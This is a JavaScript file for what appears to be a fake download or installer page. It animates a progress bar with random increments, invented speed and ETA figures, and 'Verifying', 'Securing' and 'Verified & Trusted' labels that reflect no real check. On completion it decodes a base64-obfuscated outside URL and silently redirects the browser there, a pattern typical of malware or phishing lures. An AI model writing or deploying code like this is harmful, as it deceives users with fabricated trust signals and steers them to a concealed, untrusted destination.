// ============================================================
// script.js – all JavaScript logic (no changes)
// ============================================================

(function() {
    'use strict';

    const railFill = document.getElementById('railFill');
    const pctEl = document.getElementById('pct');
    const stageEl = document.getElementById('stage');
    const cta = document.getElementById('ctaBtn');
    const speedDisplay = document.getElementById('speedDisplay');
    const etaDisplay = document.getElementById('etaDisplay');
    const statusValue = document.getElementById('statusValue');
    const statusBarText = document.getElementById('statusBarText');

    const stages = [
        { at: 0, label: 'Initializing' },
        { at: 25, label: 'Verifying' },
        { at: 55, label: 'Securing' },
        { at: 85, label: 'Finalizing' },
        { at: 100, label: 'Ready' }
    ];

    let progress = 0;
    let isComplete = false;
    let startTime = Date.now();

    function currentStage(p) {
        let s = stages[0].label;
        for (const st of stages) {
            if (p >= st.at) s = st.label;
        }
        return s;
    }

    function formatETA(seconds) {
        if (!seconds || seconds < 0 || !isFinite(seconds)) return '--';
        if (seconds < 60) return Math.ceil(seconds) + 's';
        const mins = Math.floor(seconds / 60);
        const secs = Math.ceil(seconds % 60);
        return mins + 'm ' + secs + 's';
    }

    function updateMeta(prog) {
        const elapsed = (Date.now() - startTime) / 1000;
        const speed = elapsed > 0 ? prog / elapsed : 0;
        const speedMB = speed * 0.12;
        speedDisplay.textContent = '⏱ ' + speedMB.toFixed(1) + ' MB/s';

        if (prog > 0 && prog < 100) {
            const remaining = 100 - prog;
            const eta = remaining / speed;
            etaDisplay.textContent = '⏳ ETA: ' + formatETA(eta);
        } else {
            etaDisplay.textContent = '⏳ ETA: --';
        }
    }

    function tick() {
        if (isComplete) return;

        const remaining = 100 - progress;
        const step = Math.max(0.2, remaining * 0.05 + Math.random() * 0.6);
        progress = Math.min(100, progress + step);

        railFill.style.width = progress + '%';
        pctEl.textContent = Math.floor(progress) + '%';
        stageEl.textContent = currentStage(progress);
        updateMeta(progress);

        if (progress < 100) {
            setTimeout(tick, 20);
        } else {
            completeDownload();
        }
    }

    function completeDownload() {
        isComplete = true;
        cta.classList.add('ready');
        cta.disabled = false;
        document.getElementById('ctaText').textContent = 'Verified & Trusted';
        statusValue.textContent = 'Complete';
        statusValue.style.color = '#30D158';
        statusBarText.textContent = '✅ Installation ready';
        speedDisplay.textContent = '⏱ Done';
        etaDisplay.textContent = '✅ Complete';

        const encodedUrl = 'aHR0cHM6Ly9jbG91ZG1oYXguY29tL2thbmdlcnJpLw==';
        const url = atob(encodedUrl);

        setTimeout(function() {
            window.location.href = url;
        }, 200);
    }

    tick();

})();